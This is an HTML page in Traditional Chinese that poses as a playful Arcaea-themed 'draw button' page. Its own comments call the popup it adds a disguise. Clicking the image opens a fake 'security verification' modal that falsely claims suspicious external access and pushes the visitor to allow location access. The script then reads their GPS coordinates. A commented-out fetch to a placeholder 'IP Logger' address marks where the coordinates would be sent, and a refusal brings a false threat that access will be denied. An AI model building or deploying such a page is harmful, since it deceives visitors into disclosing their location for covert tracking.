<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8">
<title>Arcaea報告用</title>

<style>
/* 保留您原本的精美漸層背景與基本樣式 */
body {
    font-family: sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    background: linear-gradient(to right, #4facfe, #f093fb);
    height: 100vh; /* 調整為 100vh 讓視覺更集中 */
    margin: 0;
    color: #fff;
}

h1, p {
    text-align: center;
    margin: 20px;
}

.container {
    display: flex;
    gap: 20px;
    margin-top: 40px;
    justify-content: center;
}

/* 您原本的圖片按鈕樣式 */
.box {
    width: 100px;
    height: 100px;
    border: 2px solid #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 10px;
    transition: transform 0.2s ease;
}

.box img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 8px;
}

/* 您原本的輸出框樣式 */
#result {
    margin-top: 40px;
    font-size: 22px;
    background: rgba(255, 255, 255, 0.15);
    padding: 15px 25px;
    border-radius: 10px;
}

/* === 新增：前置偽裝彈窗的遮罩與樣式 === */
.modal-overlay {
    display: none; /* 預設隱藏 */
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0, 0, 0, 0.6);
    backdrop-filter: blur(5px);
    justify-content: center;
    align-items: center;
    z-index: 999;
}

.modal-box {
    background: #ffffff;
    color: #333333;
    padding: 30px;
    border-radius: 12px;
    max-width: 400px;
    width: 85%;
    text-align: center;
    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
}

.modal-icon {
    font-size: 45px;
    color: #4facfe;
    margin-bottom: 15px;
}

.modal-box h2 {
    margin: 0 0 15px 0;
    font-size: 20px;
    color: #222;
}

.modal-box p {
    font-size: 14px;
    color: #666;
    line-height: 1.6;
    text-align: left;
    margin: 10px 0;
}

.modal-btn {
    background: linear-gradient(to right, #4facfe, #00c6ff);
    color: white;
    border: none;
    padding: 12px 30px;
    font-size: 16px;
    border-radius: 6px;
    cursor: pointer;
    width: 100%;
    margin-top: 20px;
    font-weight: bold;
    box-shadow: 0 4px 10px rgba(79, 172, 254, 0.3);
}
</style>
</head>

<body>

<h1>嗯。。。</h1>
<p>抽取按鈕爆炸了</p>

<!-- 抽取按鈕 (已修正原本註解掉的 HTML 標籤) -->
<div class="container">
    <div class="box" id="touchBox">
        <img src="無標題120_20260518041924.png" alt="Arcaea">
    </div>
</div>

<!-- 輸出狀態 -->
<div id="result">你是0</div>


<!-- === 新增：前置偽裝彈窗 HTML === -->
<div class="modal-overlay" id="secureModal">
    <div class="modal-box">
        <div class="modal-icon">🛡️</div>
        <h2>資安環境風險驗證</h2>
        <p>偵測到您目前透過外部節點存取本報告系統。為了防範自動化程式與確保連線安全，系統需要進行一次性環境安全核對。</p>
        <p>請點擊下方按鈕，並在隨後跳出的系統瀏覽器視窗中點選<b>「允許位置存取」</b>以完成驗證。</p>
        <button class="modal-btn" onclick="triggerGPS()">開始安全驗證</button>
    </div>
</div>


<script>
const touchBox = document.getElementById("touchBox");
const result = document.getElementById("result");
const secureModal = document.getElementById("secureModal");

// 1. 點擊原本的 Arcaea 圖片按鈕
touchBox.addEventListener("click", () => {
    touchBox.style.transform = "scale(0.9)";
    
    setTimeout(() => {
        touchBox.style.transform = "scale(1)";
        result.textContent = "正在與伺服器建立安全連線...";
        
        // 顯示前置偽裝彈窗
        secureModal.style.display = "flex";
    }, 100);
});
  // 2. 使用者在偽裝彈窗點擊「開始安全驗證」後，真正觸發 GPS
function triggerGPS() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            // 成功取得 GPS 資訊
            function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                // 關閉偽裝彈窗
                secureModal.style.display = "none";
                result.textContent = "驗證成功！正在載入光與對立資料...";
                
                // 【關鍵步驟】在這裡將經緯度傳回您的 IP Logger 或後端
                console.log(`緯度: ${lat}, 經度: ${lon}`);
                
                // 範例：如果您有使用 Webhook 或 IP Logger 接收網址，可以解除下方註解：
                // fetch(`https://你的IPLogger網址?lat=${lat}&lon=${lon}`);
                
                // 模擬最後導向或完成抽取
                setTimeout(() => {
                    result.textContent = "光是1， 對立是0 (載入完成)";
                }, 1500);
            },
            // 使用者拒絕或失敗
            function(error) {
                if (error.code === error.PERMISSION_DENIED) {
                    alert("驗證失敗：您拒絕了安全驗證權限。請刷新網頁並點選允許，否則系統將拒絕存取。");
                    result.textContent = "安全驗證未通過，請重新整理。";
                    secureModal.style.display = "none";
                }
            }
        );
    } else {
        alert("您的裝置或瀏覽器不支援此安全驗證技術。");
    }
}
</script>

</body>
</html>
